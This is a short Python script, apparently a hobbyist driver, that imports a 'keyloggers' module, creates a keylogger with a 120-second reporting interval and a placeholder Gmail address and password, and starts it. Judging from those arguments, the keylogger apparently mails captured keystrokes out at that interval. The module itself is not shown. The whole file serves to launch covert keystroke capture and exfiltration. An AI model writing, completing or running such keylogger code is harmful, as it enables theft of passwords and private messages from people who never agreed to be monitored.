#!usr/bin/env python
import keyloggers

my_keylogger = keyloggers.Keylogger(120, "abcd@gmail.com" , "1234") #using dummy email
#120 sec
#my_keylogger is a instance of the keylogger class
my_keylogger.start()
